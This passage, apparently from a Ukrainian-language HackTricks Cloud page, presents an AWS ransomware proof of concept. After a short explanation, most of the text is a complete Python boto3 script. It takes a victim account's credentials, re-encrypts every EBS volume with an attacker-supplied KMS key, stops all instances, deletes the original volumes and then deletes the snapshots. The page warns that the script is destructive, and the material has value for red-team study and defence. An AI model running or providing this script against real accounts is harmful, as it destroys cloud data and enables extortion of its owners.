–ê–ª–µ –∫–æ–ª–∏ –≤–∏ —Å–ø—Ä–æ–±—É—î—Ç–µ —Ñ–∞–∫—Ç–∏—á–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ EC2-–µ–∫–∑–µ–º–ø–ª—è—Ä –∑ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–º EBS-—Ç–æ–º–æ–º, –≤—ñ–Ω –ø—Ä–æ—Å—Ç–æ –∑–∞–∑–Ω–∞—î –Ω–µ–≤–¥–∞—á—ñ —ñ –∑–Ω–æ–≤—É –ø–µ—Ä–µ–π–¥–µ –∑ —Å—Ç–∞–Ω—É '–æ—á—ñ–∫—É–≤–∞–Ω–Ω—è' –≤ —Å—Ç–∞–Ω '–∑—É–ø–∏–Ω–µ–Ω–æ' –Ω–∞–∑–∞–≤–∂–¥–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –ø—Ä–∏—î–¥–Ω–∞–Ω–∏–π EBS-—Ç–æ–º –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–ª—é—á–∞, –æ—Å–∫—ñ–ª—å–∫–∏ –ø–æ–ª—ñ—Ç–∏–∫–∞ –∫–ª—é—á–∞ –±—ñ–ª—å—à–µ —Ü—å–æ–≥–æ –Ω–µ –¥–æ–∑–≤–æ–ª—è—î.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

–¶–µ python-—Å–∫—Ä–∏–ø—Ç, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è. –í—ñ–Ω –ø—Ä–∏–π–º–∞—î AWS –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–ª—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É '–∂–µ—Ä—Ç–≤–∏' —Ç–∞ –∑–∞–≥–∞–ª—å–Ω–æ–¥–æ—Å—Ç—É–ø–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è AWS ARN –¥–ª—è –∫–ª—é—á–∞, —è–∫–∏–π –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è. –°–∫—Ä–∏–ø—Ç —Å—Ç–≤–æ—Ä–∏—Ç—å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –∫–æ–ø—ñ—ó –í–°–Ü–• –¥–æ—Å—Ç—É–ø–Ω–∏—Ö EBS-—Ç–æ–º—ñ–≤, –ø—Ä–∏—î–¥–Ω–∞–Ω–∏—Ö –¥–æ –í–°–Ü–• EC2-–µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ —É —Ü—ñ–ª—å–æ–≤–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ AWS, –ø–æ—Ç—ñ–º –∑—É–ø–∏–Ω–∏—Ç—å –∫–æ–∂–µ–Ω EC2-–µ–∫–∑–µ–º–ø–ª—è—Ä, –≤—ñ–¥'—î–¥–Ω–∞—î –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ EBS-—Ç–æ–º–∏, –≤–∏–¥–∞–ª–∏—Ç—å —ó—Ö —ñ, –Ω–∞—Ä–µ—à—Ç—ñ, –≤–∏–¥–∞–ª–∏—Ç—å –≤—Å—ñ –∑–Ω—ñ–º–∫–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –ø—ñ–¥ —á–∞—Å –ø—Ä–æ—Ü–µ—Å—É. –¶–µ –∑–∞–ª–∏—à–∏—Ç—å –ª–∏—à–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ EBS-—Ç–æ–º–∏ –≤ —Ü—ñ–ª—å–æ–≤–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ '–∂–µ—Ä—Ç–≤–∏'. –í–ò–ö–û–†–ò–°–¢–û–í–£–ô–¢–ï –¶–ï–ô –°–ö–†–ò–ü–¢ –¢–Ü–õ–¨–ö–ò –í –¢–ï–°–¢–û–í–û–ú–£ –°–ï–†–ï–î–û–í–ò–©–Ü, –í–Ü–ù –Ñ –†–£–ô–ù–Ü–í–ù–ò–ú –Ü –í–ò–î–ê–õ–ò–¢–¨ –£–°–Ü –û–†–ò–ì–Ü–ù–ê–õ–¨–ù–Ü EBS-–¢–û–ú–ò. –í–∏ –º–æ–∂–µ—Ç–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—Ö, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ KMS-–∫–ª—é—á, —ñ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—Ö –¥–æ —ó—Ö–Ω—å–æ–≥–æ –ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ —Å—Ç–∞–Ω—É —á–µ—Ä–µ–∑ –∑–Ω—ñ–º–∫–∏, –∞–ª–µ –ø—Ä–æ—Å—Ç–æ —Ö–æ—á—É, —â–æ–± –≤–∏ –∑–Ω–∞–ª–∏, —â–æ –≤ –∫—ñ–Ω—Ü–µ–≤–æ–º—É –ø—ñ–¥—Å—É–º–∫—É —Ü–µ —î PoC –ø—Ä–æ–≥—Ä–∞–º-–≤–∏–º–∞–≥–∞—á—ñ–≤.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
